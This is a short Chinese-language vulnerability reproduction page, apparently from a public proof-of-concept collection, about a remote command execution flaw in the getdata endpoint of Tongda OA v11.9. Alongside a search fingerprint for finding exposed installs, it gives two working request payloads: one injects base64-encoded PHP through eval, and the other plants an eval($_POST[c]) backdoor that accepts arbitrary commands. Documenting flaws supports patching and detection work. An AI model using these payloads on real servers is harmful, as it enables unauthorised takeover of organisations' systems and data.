# 通达OA v11.9 getdata 任意命令执行漏洞

## 漏洞描述

通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限

## 漏洞影响

<a-checkbox checked>通达OA v11.9 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="通达OA网络智能办公系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1664008395196-d3f13158-1282-4a6a-8725-913db5edf1c0.png)

验证POC

```sql
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage
```

![img](../../../.vuepress/public/img/1664008478991-cda68968-6ac3-4d74-a583-7f1a42cbced2.png)

``` sql
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage
```